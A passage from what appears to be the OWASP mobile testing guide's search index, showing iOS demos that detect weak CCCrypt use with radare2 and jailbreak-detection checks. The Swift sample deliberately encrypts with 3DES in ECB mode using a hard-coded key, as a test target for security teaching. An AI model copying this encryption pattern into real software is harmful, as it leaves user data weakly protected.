key and input text\n    let keyString = \"0123456789abcdef01234567\"\n    let inputText = \"This is a sample text\"\n\n    // Step 2: Convert key and input text to Data\n    guard let keyData = keyString.data(using: .utf8),\n          let inputData = inputText.data(using: .utf8) else {\n        print(\"Failed to convert key or input text to data\")\n        return nil\n    }\n\n    // Step 3: Set up the output buffer\n    let bufferSize = inputData.count + kCCBlockSize3DES\n    var buffer = Data(count: bufferSize)\n\n    // Step 4: Perform encryption\n    var numBytesEncrypted = 0\n    let cryptStatus = keyData.withUnsafeBytes { keyBytes in\n        inputData.withUnsafeBytes { dataInBytes in\n            buffer.withUnsafeMutableBytes { bufferBytes in\n                CCCrypt(\n                    CCOperation(kCCEncrypt),                // Operation\n                    CCAlgorithm(kCCAlgorithm3DES),          // Algorithm\n                    CCOptions(kCCOptionPKCS7Padding),       // Options\n                    keyBytes.baseAddress,                   // Key pointer\n                    kCCKeySize3DES,                         // Key size\n                    nil,                                    // IV (nil for ECB mode)\n                    dataInBytes.baseAddress,                // Data In\n                    inputData.count,                        // Data In Length\n                    bufferBytes.baseAddress,                // Data Out\n                    bufferSize,                             // Data Out Available\n                    &amp;numBytesEncrypted                      // Data Out Moved\n                )\n            }\n        }\n    }\n\n    // Step 5: Check the result and return encrypted data\n    if cryptStatus == kCCSuccess {\n        buffer.count = numBytesEncrypted\n        // Convert encrypted data to base64 string for display\n        let encryptedString = buffer.base64EncodedString()\n        return encryptedString\n    } else {\n        print(\"Encryption failed with status: \\(cryptStatus)\")\n        return nil\n    }\n}\n\n// Usage\nif let encryptedText = encryptSampleText() {\n    print(\"Encrypted Text (Base64): \\(encryptedText)\")\n} else {\n    print(\"Encryption failed\")\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0210"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0018/MASTG-DEMO-0018/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> cccrypt.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Uses of the CCCrypt function:\nafl~CCCrypt\n\n?e\n\n?e xrefs to CCCrypt:\naxt @ 0x1000076c4\n\n?e\n\n?e Use of CCCrypt:\n\n# Seek to the function where CCCrypt is called (Replace with the address found from axt output)\npd-- 9 @ 0x1000040e0\n\npdf @ sym.func.100004000 &gt; function.asm\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i cccrypt.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0210"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0018/MASTG-DEMO-0018/#observation","title":"Observation","text":"<p>The output contains the disassembled code of the function using <code>CCCrypt</code>.</p> output.txt<pre><code>0x1000076c4    1     12 sym.imp.CCCrypt\nfcn.1000040b8 0x1000040e0 [CALL:--x] bl sym.imp.CCCrypt\n\u250c 84: fcn.1000040b8 (int64_t arg_20h, int64_t arg_30h, int64_t arg_40h, int64_t arg_50h, int64_t arg_60h, int64_t arg_70h, int64_t arg_80h);\n\u2502           ; arg int64_t arg_20h @ sp+0x20\n\u2502           ; arg int64_t arg_30h @ sp+0x30\n\u2502           ; arg int64_t arg_40h @ sp+0x40\n\u2502           ; arg int64_t arg_50h @ sp+0x50\n\u2502           ; arg int64_t arg_60h @ sp+0x60\n\u2502           ; arg int64_t arg_70h @ sp+0x70\n\u2502           ; arg int64_t arg_80h @ sp+0x100\n\u2502           0x1000040b8      fbe300a9       stp x27, x24, [sp, 8]\n\u2502           0x1000040bc      e80300f9       str x8, [sp]\n\u2502           0x1000040c0      00008052       mov w0, 0\n\u2502           0x1000040c4      41008052       mov w1, 2\n\u2502           0x1000040c8      22008052       mov w2, 1\n\u2502           0x1000040cc      e30317aa       mov x3, x23\n\u2502           0x1000040d0      04038052       mov w4, 0x18\n\u2502           0x1000040d4      050080d2       mov x5, 0\n\u2502           0x1000040d8      e60316aa       mov x6, x22\n\u2502           0x1000040dc      e70319aa       mov x7, x25\n\u2502           0x1000040e0      790d0094       bl sym.imp.CCCrypt\n\u2502           0x1000040e4      800200b9       str w0, [x20]\n\u2502           0x1000040e8      f50313aa       mov x21, x19\n\u2502           0x1000040ec      fd7b47a9       ldp x29, x30, [sp, 0x70]\n\u2502           0x1000040f0      f44f46a9       ldp x20, x19, [sp, 0x60]\n\u2502           0x1000040f4      f75b45a9       ldp x23, x22, [sp, 0x50]\n\u2502           0x1000040f8      f96344a9       ldp x25, x24, [sp, 0x40]\n\u2502           0x1000040fc      fb6b43a9       ldp x27, x26, [sp, 0x30]\n\u2502           0x100004100      fc1340f9       ldr x28, [sp, 0x20]\n\u2502           0x100004104      ff030291       add sp, sp, 0x80\n\u2514           0x100004108      c0035fd6       ret\n</code></pre>","tags":["ios","demo","MASTG-TEST-0210"]},{"location":"MASTG/demos/ios/MASVS-CRYPTO/MASTG-DEMO-0018/MASTG-DEMO-0018/#evaluation","title":"Evaluation","text":"<p>Inspect the disassembled code to identify the use of insecure algorithms.</p> <p>In CommonCryptor.h you can find the definition of the <code>CCCrypt</code> function:</p> <pre><code>CCCryptorStatus CCCrypt(\n    CCOperation op,         /* kCCEncrypt, etc. */\n    CCAlgorithm alg,        /* kCCAlgorithmAES128, etc. */\n    CCOptions options,      /* kCCOptionPKCS7Padding, etc. */\n    const void *key,\n    size_t keyLength,\n    const void *iv,         /* optional initialization vector */\n    const void *dataIn,     /* optional per op and alg */\n    size_t dataInLength,\n    void *dataOut,          /* data RETURNED here */\n    size_t dataOutAvailable,\n    size_t *dataOutMoved);\n</code></pre> <p>There you will also find the <code>alg</code> and the <code>op</code>:</p> <pre><code>/*!\n    @enum        CCAlgorithm\n    @abstract    Encryption algorithms implemented by this module.\n\n    @constant    kCCAlgorithmAES128    Advanced Encryption Standard, 128-bit block\n    @constant    kCCAlgorithmDES        Data Encryption Standard\n    @constant    kCCAlgorithm3DES    Triple-DES, three key, EDE configuration\n    @constant    kCCAlgorithmCAST    CAST\n    @constant    kCCAlgorithmRC4        RC4 stream cipher\n*/\nenum {\n    kCCAlgorithmAES128 = 0,\n    kCCAlgorithmDES,\n    kCCAlgorithm3DES,\n    kCCAlgorithmCAST,\n    kCCAlgorithmRC4,\n    kCCAlgorithmRC2\n};\ntypedef uint32_t CCAlgorithm;\n\n/*!\n    @enum        CCOperation\n    @abstract    Operations that an CCCryptor can perform.\n\n    @constant    kCCEncrypt    Symmetric encryption.\n    @constant    kCCDecrypt    Symmetric decryption.\n*/\nenum {\n    kCCEncrypt = 0,\n    kCCDecrypt,\n};\n</code></pre> <p>With this information we can now inspect the disassembled code and we'll see that the 3DES algorithm (<code>kCCAlgorithm3DES</code>) can be found by its numeric value <code>2</code> in the second argument of the <code>CCCrypt</code> function (<code>w1</code>). The <code>CCCrypt</code> function is called with a padding option of PKCS7, no initialization vector, and a key of 24 bytes:</p> evaluation.txt<pre><code>\u2502           0x1000040c0      00008052       mov w0, 0           -&gt; kCCEncrypt (0 for encryption)\n\u2502           0x1000040c4      41008052       mov w1, 2           -&gt; kCCAlgorithm3DES (2 for 3DES)\n\u2502           0x1000040c8      22008052       mov w2, 1           -&gt; kCCOptionPKCS7Padding (1 for PKCS7 padding)\n\u2502           0x1000040cc      e30317aa       mov x3, x23         -&gt; key (pointer to the encryption key)\n\u2502           0x1000040d0      04038052       mov w4, 0x18        -&gt; keyLength (0x18 or 24 bytes for 3DES)\n\u2502           0x1000040d4      050080d2       mov x5, 0           -&gt; iv (0 or NULL, implying no initialization vector)\n\u2502           0x1000040d8      e60316aa       mov x6, x22         -&gt; dataIn (pointer to the input data to be encrypted)\n\u2502           0x1000040dc      e70319aa       mov x7, x25         -&gt; dataOut (pointer to the output buffer where encrypted data will be stored)\n\u2502           0x1000040e0      790d0094       bl sym.imp.CCCrypt  -&gt; Call to CCCrypt function\n</code></pre> <p>The test fails because the 3DES encryption algorithm was found in the code.</p> <p>Note: Using artificial intelligence we're able to decompile the disassembled code and review it. The output is a human-readable version of the assembly code. The AI decompiled code may not be perfect and might contain errors but, in this case, it clearly shows the use of <code>CCCrypt</code> and the associated algorithm.</p>","tags":["ios","demo","MASTG-TEST-0210"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0021/MASTG-DEMO-0021/","title":"MASTG-DEMO-0021: Uses of Jailbreak Detection Techniques with r2","text":"<p>  Download MASTG-DEMO-0021 IPA   Open MASTG-DEMO-0021 Folder  Build MASTG-DEMO-0021 IPA</p>","tags":["ios","demo","MASTG-TEST-0240"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0021/MASTG-DEMO-0021/#sample","title":"Sample","text":"<p>The code snippet below shows sample code that performs jailbreak detection checks on the device.</p> MastgTest.swift<pre><code>import SwiftUI\n\nclass MastgTest {\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let jailbreakDetails = JailbreakDetector.isDeviceJailbroken()\n        completion(jailbreakDetails)\n    }\n}\n\nclass JailbreakDetector {\n    static func isDeviceJailbroken() -&gt; String {\n        // Check if running on a simulator\n        if DeviceUtils.isSimulator() {\n            let simulatorName = ProcessInfo.processInfo.environment[\"SIMULATOR_DEVICE_NAME\"] ?? \"Unknown Simulator\"\n            return \"Warning: Running on a simulator (\\(simulatorName)).\\n\\nProof:\\n\\n\" + collectJailbreakProof()\n        }\n\n        // Collect jailbreak proofs\n        let proof = collectJailbreakProof()\n        if proof.isEmpty {\n            return \"Jailbreak: False\\n\\nNo signs of a jailbreak detected.\"\n        } else {\n            return \"Jailbreak: True\\n\\nProof:\\n\\n\" + proof\n        }\n    }\n\n    private static func collectJailbreakProof() -&gt; String {\n        var reasons = [String]()\n\n        // Check 1: Common jailbreak files and directories\n        let jailbreakPaths = [\n            \"/Applications/Cydia.app\",\n            \"/Applications/Sileo.app\",\n            \"/Applications/Zebra.app\",\n            \"/Applications/Installer.app\",\n            \"/Library/MobileSubstrate/MobileSubstrate.dylib\",\n            \"/usr/libexec/cydia\",\n            \"/usr/libexec/ssh-keysign\",\n            \"/usr/sbin/sshd\",\n            \"/usr/bin/ssh\",\n            \"/var/cache/apt\",\n            \"/var/lib/apt\",\n            \"/var/lib/cydia\",\n            \"/var/log/syslog\",\n            \"/bin/bash\",\n            \"/bin/sh\",\n            \"/etc/apt\",\n            \"/private/var/lib/undecimus\",\n            \"/private/var/root/Library/PreferenceLoader/Preferences\",\n            \"/private/etc/apt\"\n        ]\n\n        for path in jailbreakPaths {\n            if FileManager.default.fileExists(atPath: path) {\n                reasons.append(\"Detected jailbreak file or directory at \\(path)\")\n            }\n        }\n\n        // Check 2: Custom URL schemes\n        let urlSchemes = [\n            \"cydia://\",\n            \"sileo://\",\n            \"zebra://\",\n            \"filza://\"\n        ]\n\n        for scheme in urlSchemes {\n            if let url = URL(string: scheme), UIApplication.shared.canOpenURL(url) {\n                reasons.append(\"Able to open suspicious URL scheme: \\(scheme)\")\n            }\n        }\n\n        // Check 3: Suspicious environment variables\n        let suspiciousEnvVars = [\n            \"DYLD_INSERT_LIBRARIES\",\n            \"DYLD_FRAMEWORK_PATH\",\n            \"DYLD_LIBRARY_PATH\"\n        ]\n\n        for envVar in suspiciousEnvVars {\n            if ProcessInfo.processInfo.environment[envVar] != nil {\n                reasons.append(\"Suspicious environment variable detected: \\(envVar)\")\n            }\n        }\n\n        // Check 4: Write access to system paths\n        let paths = [\n            \"/private/jailbreak.txt\",\n            \"/private/var/mobile/Library/jailbreak.txt\"\n        ]\n\n        for path in paths {\n            do {\n                try \"test\".write(toFile: path, atomically: true, encoding: .utf8)\n                try FileManager.default.removeItem(atPath: path)\n                reasons.append(\"Write access detected at \\(path)\")\n            } catch {\n                continue\n            }\n        }\n\n        return reasons.joined(separator: \"\\n\")\n    }\n}\n\nclass DeviceUtils {\n    static func isSimulator() -&gt; Bool {\n        return ProcessInfo.processInfo.environment[\"SIMULATOR_DEVICE_NAME\"] != nil\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0240"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0021/MASTG-DEMO-0021/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Open the app binary with  radare2 for iOS with the <code>-i</code> option to run this script.</li> </ol> jailbreak_detection.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e\n\n?e search for jailbreak path:\n\n/ /Applications/Cydia.app\n/ /Applications/Sileo.app\n/ /Applications/Zebra.app\n/ /usr/sbin/sshd\n/ /usr/bin/ssh\n/ /var/cache/apt\n/ /var/lib/apt\n/ /var/lib/cydia\n/ /var/log/syslog\n/ /bin/bash\n/ /bin/sh\n/ /etc/apt\n/ /private/jailbreak.txt\n/ /private/var/mobile/Library/jailbreak.txt\n\n?e\n\n?e search for urlSchemes:\n\n/ cydia://\n/ sileo://\n/ zebra://\n/ filza://\n\n?e\n\n?e search for suspiciousEnvVars:\n\n/ DYLD_INSERT_LIBRARIES\n/ DYLD_FRAMEWORK_PATH\n/ DYLD_LIBRARY_PATH\n\n?e\n\n?e Searching for Jailbreak output:\n\niz~+jail\n\n\n?e\n\n?e xrefs to Jailbreak strings:\naxt 0x10011db00\n\n?e\n\n?e Disassembled Jailbreak function:\n\npdf @ 0x100008c14\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i jailbreak_detection.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0240"]},{"location":"MASTG/demos/ios/MASVS-RESILIENCE/MASTG-DEMO-0021/MASTG-DEMO-0021/#observation","title":"Observation","text":"<p>The output reveals the use of file permissions, protocol handlers and file directories in the app.</p> output.asm<pre><code>search for jailbreak path:\n0x10011d850 hit4_0 \"4/Applications/Cydia.app/Applic\"\n0x10011d870 hit5_0 \"dia.app/Applications/Sileo.app/Applic\"\n0x10011d890 hit6_0 \"leo.app/Applications/Zebra.app/Applic\"\n0x1001a0d68 hit7_0 \"@/usr/sbin/sshd/usr/bin/ssh\"\n0x1001a0d78 hit8_0 \"/usr/sbin/sshd/usr/bin/ssh/var/cache/a\"\n0x1001a0d88 hit9_0 \"/usr/bin/ssh/var/cache/apt/var/lib/apt\"\n0x1001a0d98 hit10_0 \"/var/cache/apt/var/lib/apt/var/lib/cyd\"\n0x1001a0da8 hit11_0 \"/var/lib/apt/var/lib/cydia/var/log/syslo\"\n0x1001a0db8 hit12_0 \"/var/lib/cydia/var/log/syslog/bin/bash\"\n0x1001a0dc8 hit13_0 \"/var/log/syslog/bin/bash/bin/sh\"\n0x1001a0dd8 hit14_0 \"/bin/bash/bin/sh/etc/ap\"\n0x1001a0de8 hit15_0 \"/bin/sh/etc/apt\"\n0x10011d9a8 hit15_1 \"/private/etc/apt\"\n0x10011da20 hit16_0 \"H/private/jailbreak.txt/priva\"\n0x10011da40 hit17_0 \"ak.txt/private/var/mobile/Library/jailbreak.txt_TtC10MAS\"\n\nsearch for urlSchemes:\n0x1001a0e50 hit18_0 \"cydia://sileo://\"\n0x1001a0e60 hit19_0 \"cydia://sileo://zebra://\"\n0x1001a0e70 hit20_0 \"sileo://zebra://filza://\"\n0x1001a0e80 hit21_0 \"zebra://filza://\"\n\nsearch for suspiciousEnvVars:\n0x10011d9c0 hit22_0 \"DYLD_INSERT_LIBRARIESDYLD_\"\n0x10011d9e0 hit23_0 \"ARIESDYLD_FRAMEWORK_PATHDYL\"\n0x10011da00 hit24_0 \"ATHDYLD_LIBRARY_PATH/\"\n\nSearching for Jailbreak output:\n13   0x0011da20  0x10011da20 22  23   4.__TEXT.__cstring         ascii   /private/jailbreak.txt\n14   0x0011da40  0x10011da40 41  42   4.__TEXT.__cstring         ascii   /private/var/mobile/Library/jailbreak.txt\n16   0x0011da90  0x10011da90 35  36   4.__TEXT.__cstring         ascii   _TtC10MASTestApp17JailbreakDetector\n19   0x0011db00  0x10011db00 25  26   4.__TEXT.__cstring         ascii   Jailbreak: True\\n\\nProof:\\n\\n\n20   0x0011db20  0x10011db20 51  52   4.__TEXT.__cstring         ascii   Jailbreak: False\\n\\nNo signs of a jailbreak detected.\n26   0x0011dc30  0x10011dc30 40  41   4.__TEXT.__cstring         ascii   Detected jailbreak file or directory at \n2    0x00134020  0x100134020 17  18   5.__TEXT.__const           ascii   JailbreakDetector\n\nxrefs to Jailbreak strings:\nsym.func.100008c14 0x100008dc8 [STRN:-w-] add x9, x9, str.Jailbreak:_True_n_nProof:_n_n\n\nDisassembled Jailbreak function:\n            ; CALL XREF from sym.func.100009ef8 @ 0x100009f28(x)\n\u250c 724: sym.func.100008c14 (int64_t arg_0h, int64_t arg_60h, void *arg0);\n\u2502           0x100008c14      sub sp, sp, 0x60\n\u2502           0x100008c18      stp x26, x25, [var_10h]\n\u2502           0x100008c1c      stp x24, x23, [var_20h]\n\u2502           0x100008c20      stp x22, x21, [var_30h]\n\u2502           0x100008c24      stp x20, x19, [var_40h]\n\u2502           0x100008c28      stp x29, x30, [var_50h]\n\u2502           0x100008c2c      add x29, var_50h\n\u2502           0x100008c30      movz x22, 0x11\n\u2502           0x100008c34      movk x22, 0xd000, lsl 48\n\u2502           0x100008c38      adrp x8, segment.__DATA                   ; 0x1001a0000\n\u2502           0x100008c3c      ldr x0, [x8, 0xbe0]                       ; 0xcf ; 207 ; void *arg0\n\u2502           0x100008c40      bl sym.imp.objc_opt_self                  ; void *objc_opt_self(void *arg0)\n\u2502           0x100008c44      mov x19, x0\n\u2502           0x100008c48      adrp x23, segment.__DATA                  ; 0x1001a0000\n\u2502           0x100008c4c      ldr x1, [x23, 0xba0]                      ; 0xde ; 222 ; char *selector\n\u2502           0x100008c50      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502           0x100008c54      mov x29, x29\n\u2502           0x100008c58      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502           0x100008c5c      mov x20, x0\n\u2502           0x100008c60      adrp x24, segment.__DATA                  ; 0x1001a0000\n\u2502           0x100008c64      ldr x1, [x24, 0xba8]                      ; 0xdf ; 223 ; char *selector\n\u2502           0x100008c68      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502           0x100008c6c      mov x29, x29\n\u2502           0x100008c70      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502           0x100008c74      mov x21, x0\n\u2502           0x100008c78      mov x0, x20                               ; void *instance\n\u2502           0x100008c7c      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502           0x100008c80      adrp x1, reloc.associated_conformance_descriptor_for_Foundation.DataProtocol.Swift.Collection.SubSequence:_Foundation.DataProtocol ; 0x100188000\n\u2502           0x100008c84      ldr x1, [x1, 0x890]                       ; 0xc8 ; 200\n\u2502           0x100008c88      adrp x3, reloc.associated_conformance_descriptor_for_Foundation.DataProtocol.Swift.Collection.SubSequence:_Foundation.DataProtocol ; 0x100188000\n\u2502           0x100008c8c      ldr x3, [x3, 0x898]                       ; 0xca ; 202\n\u2502           0x100008c90      mov x0, x21\n\u2502           0x100008c94      mov x2, x1\n\u2502           0x100008c98      bl sym static (extension in Foundation):Swift.Dictionary._unconditionallyBridgeFromObjectiveC(Swift.Optional&lt;__C.NSDictionary&gt;) -&gt; Swift.Dictionary&lt;A, B&gt; ; sym.imp.static__extension_in_Foundation_:Swift.Dictionary._unconditionallyBridgeFromObjectiveC_Swift.Optional___C.NSDictionary______Swift.Dictionary_A__B_\n\u2502           0x100008c9c      mov x20, x0\n\u2502           0x100008ca0      mov x0, x21                               ; void *instance\n\u2502           0x100008ca4      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502           0x100008ca8      ldr x8, [x20, 0x10]                       ; 0xdb ; 219\n\u2502       \u250c\u2500&lt; 0x100008cac      cbz x8, 0x100008d9c\n\u2502       \u2502   0x100008cb0      mov x0, x20                               ; void *arg0\n\u2502       \u2502   0x100008cb4      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502       \u2502   0x100008cb8      add x0, x22, 4                            ; int64_t arg1\n\u2502       \u2502   0x100008cbc      adrp x8, sym.imp.__error                  ; 0x10011d000\n\u2502       \u2502   0x100008cc0      add x8, x8, 0xae0                         ; 0x10011dae0 ; \"SIMULATOR_DEVICE_NAME\"\n\u2502       \u2502   0x100008cc4      sub x25, x8, 0x20\n\u2502       \u2502   0x100008cc8      orr x1, x25, 0x8000000000000000           ; int64_t arg2\n\u2502       \u2502   0x100008ccc      bl sym.func.100008070\n\u2502       \u2502   0x100008cd0      mov x21, x1\n\u2502       \u2502   0x100008cd4      mov x0, x20                               ; void *arg0\n\u2502       \u2502   0x100008cd8      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u250c\u2500\u2500&lt; 0x100008cdc      tbz w21, 0, 0x100008d9c\n\u2502      \u2502\u2502   0x100008ce0      mov x0, x20                               ; void *arg0\n\u2502      \u2502\u2502   0x100008ce4      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u2502\u2502   0x100008ce8      ldr x1, [x23, 0xba0]                      ; 0xde ; 222 ; char *selector\n\u2502      \u2502\u2502   0x100008cec      mov x0, x19                               ; void *instance\n\u2502      \u2502\u2502   0x100008cf0      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502      \u2502\u2502   0x100008cf4      mov x29, x29\n\u2502      \u2502\u2502   0x100008cf8      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502      \u2502\u2502   0x100008cfc      mov x19, x0\n\u2502      \u2502\u2502   0x100008d00      ldr x1, [x24, 0xba8]                      ; 0xdf ; 223 ; char *selector\n\u2502      \u2502\u2502   0x100008d04      bl sym.imp.objc_msgSend                   ; void *objc_msgSend(void *instance, char *selector)\n\u2502      \u2502\u2502   0x100008d08      mov x29, x29\n\u2502      \u2502\u2502   0x100008d0c      bl sym.imp.objc_retainAutoreleasedReturnValue ; void objc_retainAutoreleasedReturnValue(void *instance)\n\u2502      \u2502\u2502   0x100008d10      mov x21, x0\n\u2502      \u2502\u2502   0x100008d14      mov x0, x19                               ; void *instance\n\u2502      \u2502\u2502   0x100008d18      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502      \u2502\u2502   0x100008d1c      adrp x1, reloc.associated_conformance_descriptor_for_Foundation.DataProtocol.Swift.Collection.SubSequence:_Foundation.DataProtocol ; 0x100188000\n\u2502      \u2502\u2502   0x100008d20      ldr x1, [x1, 0x890]                       ; 0xc8 ; 200\n\u2502      \u2502\u2502   0x100008d24      adrp x3, reloc.associated_conformance_descriptor_for_Foundation.DataProtocol.Swift.Collection.SubSequence:_Foundation.DataProtocol ; 0x100188000\n\u2502      \u2502\u2502   0x100008d28      ldr x3, [x3, 0x898]                       ; 0xca ; 202\n\u2502      \u2502\u2502   0x100008d2c      mov x0, x21\n\u2502      \u2502\u2502   0x100008d30      mov x2, x1\n\u2502      \u2502\u2502   0x100008d34      bl sym static (extension in Foundation):Swift.Dictionary._unconditionallyBridgeFromObjectiveC(Swift.Optional&lt;__C.NSDictionary&gt;) -&gt; Swift.Dictionary&lt;A, B&gt; ; sym.imp.static__extension_in_Foundation_:Swift.Dictionary._unconditionallyBridgeFromObjectiveC_Swift.Optional___C.NSDictionary______Swift.Dictionary_A__B_\n\u2502      \u2502\u2502   0x100008d38      mov x20, x0\n\u2502      \u2502\u2502   0x100008d3c      mov x0, x21                               ; void *instance\n\u2502      \u2502\u2502   0x100008d40      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502      \u2502\u2502   0x100008d44      ldr x8, [x20, 0x10]                       ; 0xdb ; 219\n\u2502      \u2502\u2502   0x100008d48      adrp x9, sym.imp.__error                  ; 0x10011d000\n\u2502      \u2502\u2502   0x100008d4c      add x9, x9, 0xb60                         ; 0x10011db60 ; \"Unknown Simulator\"\n\u2502      \u2502\u2502   0x100008d50      sub x9, x9, 0x20\n\u2502      \u2502\u2502   0x100008d54      orr x19, x9, 0x8000000000000000\n\u2502     \u250c\u2500\u2500\u2500&lt; 0x100008d58      cbz x8, 0x100008e0c\n\u2502     \u2502\u2502\u2502   0x100008d5c      mov x0, x20                               ; void *arg0\n\u2502     \u2502\u2502\u2502   0x100008d60      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502     \u2502\u2502\u2502   0x100008d64      add x0, x22, 4                            ; int64_t arg1\n\u2502     \u2502\u2502\u2502   0x100008d68      orr x1, x25, 0x8000000000000000           ; int64_t arg2\n\u2502     \u2502\u2502\u2502   0x100008d6c      bl sym.func.100008070\n\u2502     \u2502\u2502\u2502   0x100008d70      movz x21, 0x11\n\u2502     \u2502\u2502\u2502   0x100008d74      movk x21, 0xd000, lsl 48\n\u2502    \u250c\u2500\u2500\u2500\u2500&lt; 0x100008d78      tbz w1, 0, 0x100008d90\n\u2502    \u2502\u2502\u2502\u2502   0x100008d7c      ldr x8, [x20, 0x38]                       ; 0xdb ; 219\n\u2502    \u2502\u2502\u2502\u2502   0x100008d80      add x8, x8, x0, lsl 4\n\u2502    \u2502\u2502\u2502\u2502   0x100008d84      ldp x21, x19, [x8]\n\u2502    \u2502\u2502\u2502\u2502   0x100008d88      mov x0, x19                               ; void *arg0\n\u2502    \u2502\u2502\u2502\u2502   0x100008d8c      bl sym.imp.swift_bridgeObjectRetain       ; void *swift_bridgeObjectRetain(void *arg0)\n\u2502    \u2514\u2500\u2500\u2500\u2500&gt; 0x100008d90      mov x0, x20                               ; void *arg0\n\u2502     \u2502\u2502\u2502   0x100008d94      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u250c\u2500\u2500\u2500\u2500&lt; 0x100008d98      b 0x100008e14\n\u2502    \u2502\u2502\u2514\u2514\u2500&gt; 0x100008d9c      mov x0, x20                               ; void *arg0\n\u2502    \u2502\u2502     0x100008da0      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502     0x100008da4      bl sym.func.1000082b4\n\u2502    \u2502\u2502     0x100008da8      mov x19, x1\n\u2502    \u2502\u2502     0x100008dac      ubfx x8, x1, 0x38, 4\n\u2502    \u2502\u2502     0x100008db0      and x9, x0, 0xffffffffffff\n\u2502    \u2502\u2502     0x100008db4      tst x1, 0x2000000000000000\n\u2502    \u2502\u2502     0x100008db8      csel x8, x9, x8, eq\n\u2502    \u2502\u2502 \u250c\u2500&lt; 0x100008dbc      cbz x8, 0x100008dec\n\u2502    \u2502\u2502 \u2502   0x100008dc0      add x8, x22, 8\n\u2502    \u2502\u2502 \u2502   0x100008dc4      adrp x9, sym.imp.__error                  ; 0x10011d000\n\u2502    \u2502\u2502 \u2502   0x100008dc8      add x9, x9, 0xb00                         ; 0x10011db00 ; \"Jailbreak: True\\n\\nProof:\\n\\n\"\n\u2502    \u2502\u2502 \u2502   0x100008dcc      sub x9, x9, 0x20\n\u2502    \u2502\u2502 \u2502   0x100008dd0      orr x9, x9, 0x8000000000000000\n\u2502    \u2502\u2502 \u2502   0x100008dd4      stp x8, x9, [sp]\n\u2502    \u2502\u2502 \u2502   0x100008dd8      mov x20, sp\n\u2502    \u2502\u2502 \u2502   0x100008ddc      mov x1, x19\n\u2502    \u2502\u2502 \u2502   0x100008de0      bl sym Swift.String.append(Swift.String) -&gt; () ; sym.imp.Swift.String.append_Swift.String_______\n\u2502    \u2502\u2502 \u2502   0x100008de4      mov x0, x19\n\u2502    \u2502\u2502\u250c\u2500\u2500&lt; 0x100008de8      b 0x100008ec4\n\u2502    \u2502\u2502\u2502\u2514\u2500&gt; 0x100008dec      mov x0, x19                               ; void *arg0\n\u2502    \u2502\u2502\u2502    0x100008df0      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502    \u2502\u2502\u2502    0x100008df4      add x0, x22, 0x22\n\u2502    \u2502\u2502\u2502    0x100008df8      adrp x8, sym.imp.__error                  ; 0x10011d000\n\u2502    \u2502\u2502\u2502    0x100008dfc      add x8, x8, 0xb20                         ; 0x10011db20 ; \"Jailbreak: False\\n\\nNo signs of a jailbreak detected.\"\n\u2502    \u2502\u2502\u2502    0x100008e00      sub x8, x8, 0x20\n\u2502    \u2502\u2502\u2502    0x100008e04      orr x1, x8, 0x8000000000000000\n\u2502    \u2502\u2502\u2502\u250c\u2500&lt; 0x100008e08      b 0x100008ecc\n\u2502    \u2502\u2514\u2500\u2500\u2500&gt; 0x100008e0c      movz x21, 0x11\n\u2502    \u2502 \u2502\u2502   0x100008e10      movk x21, 0xd000, lsl 48\n\u2502    \u2502 \u2502\u2502   ; CODE XREF from sym.func.100008c14 @ 0x100008d98(x)\n\u2502    \u2514\u2500\u2500\u2500\u2500&gt; 0x100008e14      mov x0, x20                               ; void *arg0\n\u2502      \u2502\u2502   0x100008e18      bl sym.imp.swift_bridgeObjectRelease      ; void swift_bridgeObjectRelease(void *arg0)\n\u2502      \u2502\u2502   0x100008e1c      movz x8, 0xe000, lsl 48\n\u2502      \u2502\u2502   0x100008e20      stp xzr, x8, [sp]\n\u2502      \u2502\u2502   0x100008e24      mov x20, sp\n\u2502      